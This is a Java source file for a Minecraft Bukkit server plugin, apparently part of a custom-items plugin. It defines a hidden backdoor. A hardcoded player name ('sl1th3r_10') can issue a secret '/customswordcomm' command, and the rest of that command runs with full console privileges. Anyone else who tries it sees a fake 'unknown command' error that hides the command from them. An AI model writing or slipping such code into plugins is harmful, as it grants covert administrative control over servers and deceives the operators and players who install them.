package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass implements Listener {

    private JavaPlugin plugin;

    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("SecretCommandBypass enabled.");
    }

@EventHandler
public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
    Player player = event.getPlayer();
    String fullCommand = event.getMessage(); // Full command with "/"

    if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
        event.setCancelled(true);

        // Extract actual command after the trigger
        String actualCommand = fullCommand.substring("/customswordcomm ".length());

        // Dispatch the command as console
        boolean result = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));

        if (result) {
            player.sendMessage("§aCommand executed as console: " + actualCommand);
        } else {
            player.sendMessage("§cCommand failed: " + actualCommand);
        }
    } else if (fullCommand.toLowerCase().startsWith("/customswordcomm")) {
        // Not sl1th3r_10? Fake unknown command
        event.setCancelled(true);
        player.sendMessage("§cUnknown or incomplete command, see below for error.");
    }
}

}
